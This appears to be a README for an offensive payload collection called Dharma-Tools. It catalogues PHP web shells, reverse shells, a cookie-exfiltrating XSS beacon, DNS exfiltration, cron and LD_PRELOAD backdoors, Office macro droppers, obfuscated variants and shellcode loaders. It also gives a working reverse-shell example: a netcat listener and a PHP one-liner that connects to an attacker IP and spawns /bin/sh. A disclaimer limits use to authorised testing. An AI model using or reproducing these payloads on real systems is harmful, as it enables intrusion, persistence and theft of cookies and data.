# 💣 Dharma-Tools Payloads

This folder contains **post-exploitation payloads** designed for red team engagements, penetration testing, adversary simulation, and offensive research.

All payloads are designed for **educational use in authorized environments only**.

---

## 📂 Payload Categories

| Category       | Description                                                                 |
|----------------|-----------------------------------------------------------------------------|
| [`web/`](./web)          | Uploadable PHP shells, JavaScript beacons, polyglots                          |
| [`windows/`](./windows)      | PowerShell reverse shells, DNS exfil, batch persistence                     |
| [`linux/`](./linux)         | Bash shells, cronjob persistence, LD_PRELOAD privilege escalation payloads   |
| [`macros/`](./macros)        | Office VBA/XLM macro droppers and command exec vectors                      |
| [`obfuscation/`](./obfuscation)  | Base64-encoded, staged, or stealth variants of other payloads                |
| [`loaders/`](./loaders)       | Binary and DLL shellcode loaders for manual injection or C2 deployment      |

---

## 🔍 Highlights

### ✅ `web/`

| File                        | Description                          |
|-----------------------------|--------------------------------------|
| `reverse_shell.php`         | Full-featured PHP reverse shell (fsock) |
| `webshell_minimal.php`      | One-liner command exec with `$_GET['cmd']` |
| `php_polyglot.jpg.php`      | Image file that also executes PHP (filter bypass) |
| `xss_beacon.js`             | Exfiltrates cookies via fetch() to attacker-controlled domain |

---

### ✅ `windows/`

| File                      | Description                        |
|---------------------------|------------------------------------|
| `powershell_reverse.ps1`  | TCP reverse shell via .NET sockets |
| `dns_exfil.ps1`           | DNS-based exfiltration using `nslookup` |
| `add_user.bat`            | Creates local admin user           |

---

### ✅ `linux/`

| File                   | Description                        |
|------------------------|------------------------------------|
| `bash_reverse.sh`      | Netcat-style bash reverse shell    |
| `preload_root.c`       | LD_PRELOAD backdoor for root shell |
| `evil_cron.sh`         | Crontab backdoor to persist        |

---

### ✅ `macros/`

| File                  | Description                                  |
|-----------------------|----------------------------------------------|
| `reverse_macro.vba`   | VBA macro that launches PowerShell downloader |
| `obfuscated_excel.xlm`| Excel 4.0 macro payload (stealthy XLSB drop) |

---

### ✅ `obfuscation/`

| File                          | Description                                  |
|-------------------------------|----------------------------------------------|
| `php_reverse_shell_base64.php`| Obfuscated shell using `base64_decode()`     |
| `ps1_stage_encoded.txt`       | PowerShell reverse shell as base64 `-Enc`    |

---

### ✅ `loaders/`

| File                      | Description                               |
|---------------------------|-------------------------------------------|
| `shellcode_runner.c`      | C shellcode runner with mmap+exec support |
| `reflective_loader.dll`   | DLL stub for reflective injection (Cobalt Strike, manual shellcode) |

---

## 🧠 Usage Notes

### 📦 Reverse Shell Example (Linux)
1. On attacker machine:
   ```bash
   nc -lvnp 4444
On victim (via upload, RCE, macro, etc):

php
Copy
Edit
<?php $sock=fsockopen("10.10.14.3",4444); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
⚠️ Legal Disclaimer
These payloads are provided for research and educational use in authorized environments only.

Do not use these tools against systems you do not own or have explicit permission to test.
Use responsibly under the laws and guidelines of your country and industry.

📜 Contributing & Attribution
Tools authored and maintained by Braxton Bailey for the Dharma-Tools project.

Some payloads adapted from:

pentestmonkey.net

Revshells.com

OffensiveSecurity labs

Personal red team experience

PRs welcome for new payloads or improved stealth.

🔮 Future Payload Ideas
ASP.NET reverse shell

Python/Flask dropper for internal API RCE

TLS-encrypted reverse shell (PHP + OpenSSL)

WAF-bypass JS beacon chaining WebSockets

🧠 Stay stealthy. Encrypt everything. Always validate shells with recon.

—
Dharma-Tools Payload Arsenal
